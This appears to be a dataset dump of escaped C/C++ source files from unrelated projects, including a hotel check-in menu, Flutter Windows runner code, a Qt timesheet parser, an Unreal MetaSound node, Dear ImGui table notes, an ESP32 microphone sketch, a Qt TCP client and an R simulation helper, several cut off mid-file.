after sortByZ() - it was before ) 8-jan-2002 ejk\r\n  add cross section option (in non-partial coherence mode only)\r\n        27-may-2005 ejk\r\n  convet to faster sortByZ() 8-feb-2006 ejk\r\n  move sortbyz() to slicelib.c 5-sep-2006 ejk\r\n  add echo on y position in pixels for xz mode 4-may-2007 ejk\r\n  update data type of nxl,nyl to be consistent with new tiffsubs\r\n     17-jul-2007 ejk\r\n  move xz depthpix save to be after transmit+propagate to get a\r\n     full slice and proper anti-aliasing and also be consisten\r\n     with what you get doing it by hand  and increase possible\r\n     slices output (nz was off by one) 24-jan-2008 ejk\r\n  change propagation range to be whole unit cell not just\r\n     range of atoms to treat sparsely populated spec.\r\n     better (consistent with autostem) 23-mar-2008 ejk\r\n  take small things out of loop in trlayer() 14-may-2008 ejk\r\n  parameterize vzatomLUT() vs r^2 instead of r to avoid a lot of sqrt()\r\n      calls (a little faster)  6-j",
    "#include \"Librerias.h\"\n#include \"Contenedor Habitaciones.h\"\n#include \"Contenedor Huespedes.h\"\n#include \"Check-in.h\"\n#include \"ContenedorCheckOut.h\"\n\n\n\nint main()\n{\n\tsetlocale(LC_ALL, \"spanish\");\n\t///*system(\"color 09\");*/\n\t\n\t\n\tContenedorHabitaciones contenedorHabitaciones;\n\n    contenedorHabitaciones.RecuperarDatos();\n\n\tContenedorHuespedes contenedorHuespedes;\n\n\tcontenedorHuespedes.RecuperarContenedor();\n\n\tContenedorCheckIn ContenedorCheckin(contenedorHabitaciones, contenedorHuespedes);\n\n    ContenedorCheckin.RecuperarContenedor();\n\n    ContenedorCheckOut checkOut (ContenedorCheckin, contenedorHabitaciones, contenedorHuespedes);\n\n    checkOut.recuperarDatos();\n\n    char opcion;\n\n    do\n    {\n        system(\"cls\");\n        cout << \"******** Menu principal ***********\" << endl;\n        cout << \"* 1. - Gestionar Habitaciones -    *\" << endl;\n        cout << \"* 2. - Gestionar Huespedes    -    *\" << endl;\n        cout << \"* 3. - Gestionar Check-in     -    *\" << endl;\n        cout << \"* 4. - Gestionar Check-Out    -    *\" << endl;\n        cout << \"* 5. - Salir                  -    *\" << endl;\n        cout << \"************************************\" << endl;\n        cout << \"Ingrese una opcion: \";\n        cin >> opcion;\n\n        switch (opcion)\n        {\n            case '1':\n            {\n\t\t\t    contenedorHabitaciones.menuHabitaciones();\n\n                system(\"pause\");\n                break;\n            }\n            case '2':\n            {\n               \n\t\t\t    contenedorHuespedes.menuHuespedes();\n         \n                system(\"pause\");\n                break;\n            }\n            case '3':\n            {\n                ContenedorCheckin.menucheckIn();\n\n                system(\"pause\");\n                break;\n            }\n            case '4':\n            {\n               /* cout << \"   Pronto Estara disponible !!!!!\" << endl;*/\n\t\t\t\tcheckOut.menuCheckOut();\n\n                system(\"pause\");\n                break;\n            }\n            case '5':\n            {\n\t\t\t\n\t\t\t    char confirmacion;\n\t\t\t    cout << \"\\033[1;33m Desea salir del programa? (s/n): \\033[0m\";\n\t\t\t    cin >> confirmacion;\n\t\t\t    if (confirmacion == 's' || confirmacion == 'S')\n\t\t\t    {\n\t\t\t\t    system(\"cls\");\n\t\t\t\t    cout << \"\\033[1;33m------------------------------------------------\" << endl;\n\t\t\t\t    cout << \"Gracias por usar el programa, Vuelve Pronto !!! \" << endl;\n\t\t\t\t    cout << \"------------------------------------------------\\033[0m\" << endl;\n\t\t\t\t\n\t\t\t    }\n\t\t\t    else\n\t\t\t    {\n\t\t\t\t    opcion = '0';\n\t\t\t    }\n\n                break;\n            }\n            default:\n            {\n                cout << \"Ingrese un valor valido !!\" << endl;\n                break;\n            }\n\n        }\n    } while (opcion != '5');\n\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"flutter_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"xdtsio.h\"\n\n#include <iostream>\n#include <QJsonObject>\n#include <QJsonArray>\n#include <QRegExp>\n#include <QFile>\n#include <QJsonDocument>\n#include <QApplication>\n#include <QDesktopServices>\n#include <QUrl>\n\nQString XdtsFrameDataItem::SYMBOL_TICK_1    = \"SYMBOL_TICK_1\";\nQString XdtsFrameDataItem::SYMBOL_TICK_2    = \"SYMBOL_TICK_2\";\nQString XdtsFrameDataItem::SYMBOL_NULL_CELL = \"SYMBOL_NULL_CELL\";\nQString XdtsFrameDataItem::SYMBOL_HYPHEN    = \"SYMBOL_HYPHEN\";\n\nnamespace {\nstatic QByteArray identifierStr(\"exchangeDigitalTimeSheet Save Data\");\n\nint _tick1Id          = -1;\nint _tick2Id          = -1;\nbool _exportAllColumn = true;\n}  // namespace\n//-----------------------------------------------------------------------------\nvoid XdtsHeader::read(const QJsonObject& json) {\n  QRegExp rx(\"\\\\d{1,4}\");\n  // TODO: We could check if the keys are valid\n  // before attempting to read them with QJsonObject::contains(),\n  // but we assume that they are.\n  m_cut = json[\"cut\"].toString();\n  if (!rx.exactMatch(m_cut))  // TODO: should handle an error\n    std::cout << \"The XdtsHeader value \\\"cut\\\" does not match the pattern.\"\n              << std::endl;\n  m_scene = json[\"scene\"].toString();\n  if (!rx.exactMatch(m_scene))\n    std::cout << \"The XdtsHeader value \\\"scene\\\" does not match the pattern.\"\n              << std::endl;\n}\n\nvoid XdtsHeader::write(QJsonObject& json) const {\n  json[\"cut\"]   = m_cut;\n  json[\"scene\"] = m_scene;\n}\n\n//-----------------------------------------------------------------------------\n\nvoid XdtsFrameDataItem::read(const QJsonObject& json) {\n  m_id                   = DataId(qRound(json[\"id\"].toDouble()));\n  QJsonArray valuesArray = json[\"values\"].toArray();\n  for (int vIndex = 0; vIndex < valuesArray.size(); ++vIndex) {\n    m_values.append(valuesArray[vIndex].toString());\n  }\n  if (json.contains(\"options\")) {\n    QJsonArray optionsArray = json[\"options\"].toArray();\n    for (int vIndex = 0; vIndex < optionsArray.size(); ++vIndex) {\n      m_options.append(optionsArray[vIndex].toString());\n    }\n  }\n}\n\nvoid XdtsFrameDataItem::write(QJsonObject& json) const {\n  json[\"id\"] = int(m_id);\n  QJsonArray valuesArray;\n  foreach (const QString& value, m_values) {\n    valuesArray.append(value);\n  }\n  json[\"values\"] = valuesArray;\n\n  if (!m_options.isEmpty()) {\n    QJsonArray optionsArray;\n    foreach (const QString& option, m_options) {\n      optionsArray.append(option);\n    }\n    json[\"options\"] = optionsArray;\n  }\n}\n\nFrameData XdtsFrameDataItem::getFrameData() const {\n  // int getCellNumber() const {\n  if (m_values.isEmpty())\n    return {QString(), FrameOption_None};  // EMPTY\n                                           // if (m_values.isEmpty()) return 0;\n  QString val = m_values.at(0);\n\n  FrameOptionId option = FrameOption_None;\n  if (!m_options.isEmpty()) {\n    QString optionStr = m_options.at(0);\n    if (optionStr == \"OPTION_KEYFRAME\")\n      option = FrameOption_KeyFrame;\n    else if (optionStr == \"OPTION_REFERENCEFRAME\")\n      option = FrameOption_ReferenceFrame;\n  }\n\n  /*\n  if (val == \"SYMBOL_NULL_CELL\")\n    return TFrameId(-1);  // EMPTY\n                          // ignore sheet symbols for now\n  else if (val == \"SYMBOL_HYPHEN\")\n    return TFrameId(-2);  // IGNORE\n  else if (val == \"SYMBOL_TICK_1\")\n    return TFrameId(SYMBOL_TICK_1);\n  else if (val == \"SYMBOL_TICK_2\")\n    return TFrameId(SYMBOL_TICK_2);\n    */\n  // return cell number\n  return {val, option};\n}\n\n//-----------------------------------------------------------------------------\nvoid XdtsTrackFrameItem::read(const QJsonObject& json) {\n  QJsonArray dataArray = json[\"data\"].toArray();\n  for (int dataIndex = 0; dataIndex < dataArray.size(); ++dataIndex) {\n    QJsonObject dataObject = dataArray[dataIndex].toObject();\n    XdtsFrameDataItem data;\n    data.read(dataObject);\n    m_data.append(data);\n  }\n  m_frame = json[\"frame\"].toInt();\n}\n\nvoid XdtsTrackFrameItem::write(QJsonObject& json) const {\n  QJsonArray dataArray;\n  foreach (const XdtsFrameDataItem& data, m_data) {\n    QJsonObject dataObject;\n    data.write(dataObject);\n    dataArray.append(dataObject);\n  }\n  json[\"data\"] = dataArray;\n\n  json[\"frame\"] = m_frame;\n}\n\n//-----------------------------------------------------------------------------\n\nQPair<int, FrameData> XdtsTrackFrameItem::frameFdata() const {\n  return QPair<int, FrameData>(m_frame, m_data[0].getFrameData());\n}\n\n//-----------------------------------------------------------------------------\nvoid XdtsFieldTrackItem::read(const QJsonObject& json) {\n  QJsonArray frameArray = json[\"frames\"].toArray();\n  for (int frameIndex = 0; frameIndex < frameArray.size(); ++frameIndex) {\n    QJsonObject frameObject = frameArray[frameIndex].toObject();\n    XdtsTrackFrameItem frame;\n    frame.read(frameObject);\n    m_frames.append(frame);\n  }\n  m_trackNo = json[\"trackNo\"].toInt();\n}\n\nvoid XdtsFieldTrackItem::write(QJsonObject& json) const {\n  QJsonArray frameArray;\n  foreach (const XdtsTrackFrameItem& frame, m_frames) {\n    QJsonObject frameObjec",
    "#include \"MetasoundBranches/Public/MetasoundSlewNode.h\"\n#include \"MetasoundExecutableOperator.h\"     // TExecutableOperator class\n#include \"MetasoundPrimitives.h\"             // ReadRef and WriteRef descriptions for bool, int32, float, and string\n#include \"MetasoundNodeRegistrationMacro.h\"  // METASOUND_LOCTEXT and METASOUND_REGISTER_NODE macros\n#include \"MetasoundStandardNodesNames.h\"     // StandardNodes namespace\n#include \"MetasoundFacade.h\"                 // FNodeFacade class, eliminates the need for a fair amount of boilerplate code\n#include \"MetasoundParamHelper.h\"            // METASOUND_PARAM and METASOUND_GET_PARAM family of macros\n\n#define LOCTEXT_NAMESPACE \"MetasoundSlewNode\"\n\nnamespace Metasound\n{\n    // Vertex Names - define the node's inputs and outputs here\n    namespace SlewNodeNames\n    {\n        METASOUND_PARAM(InputSignal, \"Signal\", \"Audio signal to smooth.\");\n        METASOUND_PARAM(InputRiseTime, \"Rise Time\", \"Rise time in seconds.\");\n        METASOUND_PARAM(InputFallTime, \"Fall Time\", \"Fall time in seconds.\");\n\n        METASOUND_PARAM(OutputSignal, \"Output\", \"Slew rate limited output signal.\");\n    }\n\n    // Operator Class - defines the way the node is described, created and executed\n    class FSlewOperator : public TExecutableOperator<FSlewOperator>\n    {\n    public:\n        // Constructor\n        FSlewOperator(\n            const FAudioBufferReadRef& InSignal,\n            const FFloatReadRef& InRiseTime,\n            const FFloatReadRef& InFallTime,\n            int32 InSampleRate)\n            : InputSignal(InSignal)\n            , InputRiseTime(InRiseTime)\n            , InputFallTime(InFallTime)\n            , OutputSignal(FAudioBufferWriteRef::CreateNew(InputSignal->Num()))\n            , PreviousOutputSample(0.0f)\n            , SampleRate(InSampleRate)\n        {\n        }\n\n        // Helper function for constructing vertex interface\n        static const FVertexInterface& DeclareVertexInterface()\n        {\n            using namespace SlewNodeNames;\n\n            static const FVertexInterface Interface(\n                FInputVertexInterface(\n                    TInputDataVertexModel<FAudioBuffer>(METASOUND_GET_PARAM_NAME_AND_METADATA(InputSignal)),\n                    TInputDataVertexModel<float>(METASOUND_GET_PARAM_NAME_AND_METADATA(InputRiseTime)),\n                    TInputDataVertexModel<float>(METASOUND_GET_PARAM_NAME_AND_METADATA(InputFallTime))\n                ),\n                FOutputVertexInterface(\n                    TOutputDataVertexModel<FAudioBuffer>(METASOUND_GET_PARAM_NAME_AND_METADATA(OutputSignal))\n                )\n            );\n\n            return Interface;\n        }\n\n        // Metadata about the node\n        static const FNodeClassMetadata& GetNodeInfo()\n        {\n            auto CreateNodeClassMetadata = []() -> FNodeClassMetadata\n            {\n                FNodeClassMetadata Metadata;\n                Metadata.ClassName = { StandardNodes::Namespace, TEXT(\"Slew\"), StandardNodes::AudioVariant };\n                Metadata.MajorVersion = 1;\n                Metadata.MinorVersion = 0;\n                Metadata.DisplayName = METASOUND_LOCTEXT(\"SlewDisplayName\", \"Slew\");\n                Metadata.Description = METASOUND_LOCTEXT(\"SlewDesc\", \"Smooth the rise and fall times of an incoming signal.\");\n                Metadata.Author = PluginAuthor;\n                Metadata.PromptIfMissing = PluginNodeMissingPrompt;\n                Metadata.DefaultInterface = DeclareVertexInterface();\n                Metadata.CategoryHierarchy = { METASOUND_LOCTEXT(\"Custom\", \"Branches\") };\n                Metadata.Keywords = TArray<FText>(); // Keywords for searching\n\n                return Metadata;\n            };\n\n            static const FNodeClassMetadata Metadata = CreateNodeClassMetadata();\n            return Metadata;\n        }\n\n        // Input Data References\n        virtual FDataReferenceCollection GetInputs() const override\n        {\n            using namespace SlewNodeNames;\n\n            FDataReferenceCollection InputDataReferences;\n            InputDataReferences.AddDataReadReference(METASOUND_GET_PARAM_NAME(InputSignal), InputSignal);\n            InputDataReferences.AddDataReadReference(METASOUND_GET_PARAM_NAME(InputRiseTime), InputRiseTime);\n            InputDataReferences.AddDataReadReference(METASOUND_GET_PARAM_NAME(InputFallTime), InputFallTime);\n\n            return InputDataReferences;\n        }\n\n        // Output Data References\n        virtual FDataReferenceCollection GetOutputs() const override\n        {\n            using namespace SlewNodeNames;\n\n            FDataReferenceCollection OutputDataReferences;\n            OutputDataReferences.AddDataReadReference(METASOUND_GET_PARAM_NAME(OutputSignal), OutputSignal);\n\n            return OutputDataReferences;\n        }\n\n        // Operator Factory Method\n        static TUniquePtr<IOperator> CreateOperator(const FCreateOperatorParams& InParams, FBuildErrorArray& OutErrors)\n        {\n            using namespace SlewNodeNames;\n\n ",
    "// dear imgui, v1.85 WIP\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.NavigateTo\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableDrawContextMenu()                  - draw right-click context menu\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from window/work-rect right-most edge. With -FLT_MIN or 0.0f will align exactly on right-most edge.\n//   - outer_size.x  > 0.0f  ->  Set Fixed width.",
    "#include <Arduino.h>\n#include <driver/i2s.h>\n\n#define SAMPLE_RATE 8000\n#define SAMPLE_BUFFER_SIZE 1024\n\n// Buffers para double buffering\nint16_t buffer_1[SAMPLE_BUFFER_SIZE];\nint16_t buffer_2[SAMPLE_BUFFER_SIZE];\nvolatile bool buffer_1_ready = false;\nvolatile bool buffer_2_ready = false;\n\n// i2s setup\ni2s_config_t i2s_config = {\n  .mode = (i2s_mode_t)(I2S_MODE_MASTER | I2S_MODE_RX),\n  .sample_rate = SAMPLE_RATE,\n  .bits_per_sample = I2S_BITS_PER_SAMPLE_16BIT,\n  .channel_format = I2S_CHANNEL_FMT_ONLY_LEFT,\n  .communication_format = I2S_COMM_FORMAT_I2S,\n  .intr_alloc_flags = ESP_INTR_FLAG_LEVEL1,\n  .dma_buf_count = 4,\n  .dma_buf_len = 512,\n  .use_apll = false,\n  .tx_desc_auto_clear = true,\n  .fixed_mclk = 1\n};\n\ni2s_pin_config_t i2s_mic_pins = {\n  .bck_io_num = GPIO_NUM_26,\n  .ws_io_num = GPIO_NUM_22,\n  .data_out_num = I2S_PIN_NO_CHANGE,\n  .data_in_num = GPIO_NUM_21\n};\n\n// Tarefa de captura de \u00e1udio\nvoid captureAudio(void *param) {\n  size_t bytes_read;\n  while (true) {\n    // Captura para o buffer 1 se estiver dispon\u00edvel\n    if (!buffer_1_ready) {\n      i2s_read(I2S_NUM_0, buffer_1, sizeof(buffer_1), &bytes_read, portMAX_DELAY);\n      buffer_1_ready = true;\n    }\n\n    // Captura para o buffer 2 se estiver dispon\u00edvel\n    if (!buffer_2_ready) {\n      i2s_read(I2S_NUM_0, buffer_2, sizeof(buffer_2), &bytes_read, portMAX_DELAY);\n      buffer_2_ready = true;\n    }\n\n    // Atraso opcional para ajuste fino\n    vTaskDelay(10 / portTICK_PERIOD_MS);\n  }\n}\n\n// Tarefa de envio de \u00e1udio pela UART\nvoid sendAudio(void *param) {\n  while (true) {\n    // Enviar dados do buffer 1\n    if (buffer_1_ready) {      \n      for(int i =0; i < SAMPLE_BUFFER_SIZE; i++){\n        Serial.println(buffer_1[i], DEC);\n      }\n      buffer_1_ready = false;  // Marcar buffer 1 como pronto para capturar novamente\n    }\n\n    // Enviar dados do buffer 2\n    if (buffer_2_ready) {\n      for(int i =0; i < SAMPLE_BUFFER_SIZE; i++){\n        Serial.println(buffer_2[i], DEC);\n      }\n      buffer_2_ready = false;  // Marcar buffer 2 como pronto para capturar novamente\n    }\n\n    // Atraso opcional para ajuste fino\n    vTaskDelay(10 / portTICK_PERIOD_MS);\n  }\n}\n\nvoid setup() {\n  Serial.begin(250000);\n  i2s_driver_install(I2S_NUM_0, &i2s_config, 0, NULL);\n  i2s_set_pin(I2S_NUM_0, &i2s_mic_pins);\n\n  // Criar tarefas RTOS\n  xTaskCreate(captureAudio, \"Captura de \u00c1udio\", 4096, NULL, 1, NULL);\n  xTaskCreate(sendAudio, \"Envio de \u00c1udio\", 4096, NULL, 1, NULL);\n}\n\nvoid loop() {\n  // N\u00e3o h\u00e1 nada no loop principal, pois tudo ocorre nas tarefas RTOS\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/**\n * Use QByteArray type to exchange between Server and Client,\n * as a QString stores character in 16bits\n * instead of 8bits, like a classic \"char *\" in C\n *\n * Thus, enabling C socket client programming simplification\n * as it does not need to take one character over 2 [i*2]\n */\n#include \"client.h\"\n\n#include <QGridLayout>\n#include <QLabel>\n#include <QLineEdit>\n#include <QMessageBox>\n#include <QPushButton>\n#include <QtNetwork/QTcpSocket>\n#include <QTextEdit>\n\nClient::Client(QWidget *parent) : QDialog(parent) {\n    /* *** Interactives ****** */\n    /* ****** Buttons */\n    quitBtn = new QPushButton(\"Quit\");\n    connect(quitBtn, &QPushButton::clicked, this, &Client::close);\n\n    connectBtn  = new QPushButton(\"Connect\");\n    connectBtn->setMinimumSize(50, 50);\n    /* Little trick: \"clicked\" will be false on event trigger...\n     *               So instead of simply having:\n     *                   connect(.. , .. , this, &Client::toggleConnection);\n     *               and implicitly having false as function's argument,\n     *               use lambda expression to explicitly set it.            */\n    connect(connectBtn, &QPushButton::clicked, this, [=](bool clicked) {\n        Client::toggleConnection(true);\n    });\n\n    sendDataBtn = new QPushButton(\"Send data\");\n    sendDataBtn->setMinimumSize(50, 50);\n    sendDataBtn->setEnabled(false);\n    connect(sendDataBtn, &QPushButton::clicked, this, &Client::sendToServer);\n\n    /* ****** Lines Edit */\n    ipLinEdit   = new QLineEdit(\"127.0.0.1\");\n    portLinEdit = new QLineEdit(\"5000\");\n\n    /* *** Displays ****** */\n    ipLbl   = new QLabel(\"IP   : \");\n    ipLbl->setFont({ \"Source Code Pro\" });\n    portLbl = new QLabel(\"Port : \");\n    portLbl->setFont({ \"Source Code Pro\" });\n    dataToSendLinEdit = new QLineEdit;\n    dataRecvTxtBox    = new QTextEdit;\n\n    /* *** Socket ****** */\n    tcpSocket = new QTcpSocket(this);\n    inStream.setDevice(tcpSocket);\n    connect(tcpSocket, &QIODevice::readyRead, this, &Client::readSrvResponse);\n    connect(tcpSocket, &QAbstractSocket::errorOccurred,\n            this, &Client::displayError);\n\n    /* *** Layout & Window ****** */\n    mainLayout = new QGridLayout(this);\n    mainLayout->addWidget(ipLbl, 0, 0, 1, 2);\n    mainLayout->addWidget(ipLinEdit, 0, 2, 1, 2);\n    mainLayout->addWidget(portLbl, 1, 0, 1, 2);\n    mainLayout->addWidget(portLinEdit, 1, 2, 1, 2);\n    mainLayout->addWidget(connectBtn, 2, 0, 1, 4);\n    mainLayout->addWidget(dataToSendLinEdit, 3, 0, 1, 3);\n    mainLayout->addWidget(sendDataBtn, 3, 3);\n    mainLayout->addWidget(dataRecvTxtBox, 4, 0, 1, 4);\n    mainLayout->addWidget(quitBtn, 5, 1, 1, 2);\n\n    setWindowTitle(\"QTcpSocket: Client\");\n    resize(480, 320);\n}\n\nClient::~Client() {\n    delete(quitBtn);\n    delete(connectBtn);\n    delete(sendDataBtn);\n    delete(ipLinEdit);\n    delete(portLinEdit);\n    delete(ipLbl);\n    delete(portLbl);\n    delete(dataToSendLinEdit);\n    delete(dataRecvTxtBox);\n    delete(tcpSocket);\n    delete(mainLayout);\n}\n\nvoid Client::displayError(QAbstractSocket::SocketError socketError) {\n    switch (socketError) {\n    case QAbstractSocket::RemoteHostClosedError:\n        break;\n\n    case QAbstractSocket::HostNotFoundError:\n        QMessageBox::information(this, tr(\"QTcpSocket: Client\"),\n                                 tr(\"The host was not found. Please check the \"\n                                    \"host name and port settings.\"));\n        break;\n\n    case QAbstractSocket::ConnectionRefusedError:\n        QMessageBox::information(this, tr(\"QTcpSocket: Client\"),\n                                 tr(\"The connection was refused by the peer. \"\n                                    \"Make sure the fortune server is running, \"\n                                    \"and check that the host name (%1) and \"\n                                    \"port (%2) settings are correct.\")\n                                     .arg(ipLinEdit->text())\n                                     .arg(portLinEdit->text()));\n\n        /* Cancel actions attempted during connection */\n        ipLinEdit->setEnabled(socketConnectStatus);\n        portLinEdit->setEnabled(socketConnectStatus);\n        socketConnectStatus = !socketConnectStatus;\n        sendDataBtn->setEnabled(socketConnectStatus);\n        connectBtn->setText(\"Connect\");\n        break;\n\n    default:\n        QMessageBox::information(this, tr(\"QTcpSocket: Client\"),\n                                 tr(\"The following error occurred: %1.\")\n                                     .arg(tcpSocket->errorString()));\n    }\n}\n\nvoid Client::readSrvResponse(void) {\n    inStream.startTransaction();\n\n    QByteArray streamAsBytes;\n    inStream >> streamAsBytes;\n\n    if ( ! inStream.commitTransaction() )   return;\n\n    /** Detect server's death or forced leave\n     *  + toLower() Hypothesis:\n     *  Upper -> Lower is optimized because UpperCase + offset = LowerCase\n     *  instead of a substraction LowerCase - offset = UpperCase */\n    if (streamAsBytes.toLower() == QByteArray(\"leaving\"))",
    "\n/*\n *****************************************************************************\n *****************************************************************************\n\n This file is for simulation functions that will be available from R.\n\n *****************************************************************************\n *****************************************************************************\n */\n\n#include <RcppArmadillo.h>      // arma namespace\n#include <vector>               // vector class\n#include <random>               // normal distribution\n#include <utility>              // std::pair, std::make_pair\n#include <deque>                // deque\n#include <pcg/pcg_random.hpp>   // pcg prng\n#include <progress.hpp>         // for the progress bar\n#ifdef _OPENMP\n#include <omp.h>                // OpenMP\n#endif\n\n\n#include \"pseudogameofclones_types.hpp\"  // integer types\n#include \"aphids.hpp\"           // aphid classes\n#include \"patches.hpp\"          // field and plant classes\n#include \"pcg.hpp\"              // mt_seeds seed_pcg fxns\n\n\n\n/*\n Allows you to verify that you're able to use multiple threads.\n */\n//[[Rcpp::export]]\nbool using_openmp() {\n    bool out = false;\n#ifdef _OPENMP\n    out = true;\n#endif\n    return out;\n}\n\n\n\n\n//' Check that the number of threads doesn't exceed the number available, and change\n//' to 1 if OpenMP isn't enabled.\n//'\n//' @noRd\n//'\ninline void thread_check(uint32& n_threads) {\n\n#ifdef _OPENMP\n    if (n_threads == 0) n_threads = 1;\n    if (n_threads > omp_get_max_threads()) {\n        std::string max_threads = std::to_string(omp_get_max_threads());\n        std::string err_msg = \"\\nThe number of requested threads (\" +\n            std::to_string(n_threads) + \") exceeds the max available on the system (\" +\n            max_threads + \").\";\n        stop(err_msg.c_str());\n    }\n#else\n    n_threads = 1;\n#endif\n\n    return;\n}\n\n// For checking for user interrupts every N iterations:\ninline bool interrupt_check(uint32& iters,\n                            Progress& prog_bar,\n                            const uint32& N = 100) {\n    ++iters;\n    if (iters > N) {\n        if (prog_bar.is_aborted() || prog_bar.check_abort()) return true;\n        prog_bar.increment(iters);\n        iters = 0;\n    }\n    return false;\n}\n\n\n\n\n\n// Calculate the number of rows per rep.\nvoid calc_rep_rows(uint32& n_rows,\n                   uint32& n_rows_wasps,\n                   const uint32& max_t,\n                   const uint32& save_every,\n                   const uint32& n_lines,\n                   const uint32& n_fields,\n                   const uint32& n_plants,\n                   const bool& sep_adults) {\n\n    // Rows for wasps is just the number of time points * number of fields:\n    n_rows_wasps = 